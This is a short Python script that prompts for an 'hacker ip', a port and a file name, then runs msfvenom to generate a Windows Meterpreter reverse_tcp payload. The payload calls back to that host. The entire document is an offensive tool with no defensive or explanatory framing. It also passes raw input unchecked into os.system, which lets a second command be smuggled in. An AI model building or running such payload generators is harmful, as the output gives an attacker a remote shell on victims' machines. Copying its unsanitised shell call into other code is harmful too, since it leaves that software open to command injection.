import os

os.system("clear")
xip = input("enter the hacker ip: ")
xport = input("enter the connect port: ")
xsave = input("save to ? : ")

code = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + xip + " LPORT=" + xport + " -o " + xsave

os.system(code)
